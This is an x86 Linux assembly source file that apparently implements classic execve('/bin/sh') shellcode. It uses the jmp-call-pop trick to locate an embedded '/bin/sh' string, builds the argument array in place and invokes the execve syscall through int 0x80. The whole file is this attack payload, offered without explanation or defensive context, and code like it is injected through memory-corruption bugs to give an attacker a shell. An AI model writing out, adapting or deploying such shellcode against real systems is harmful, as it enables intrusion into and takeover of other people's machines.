.text

.globl _start

_start:

  jmp GotoCall

shellcode:

  popl %ebp
  xorl %eax, %eax
  movb %al, 7(%ebp)
  leal (%ebp), %ebx
  movl %ebx, 8(%ebp)
  movl %eax, 12(%ebp)
  movb $0x0b, %al
  movl %ebp, %ebx
  leal 8(%ebp), %ecx
  leal 12(%ebp), %edx
  int $0x80

GotoCall:

  call shellcode

  .asciz "/bin/shABBBBCCCC"
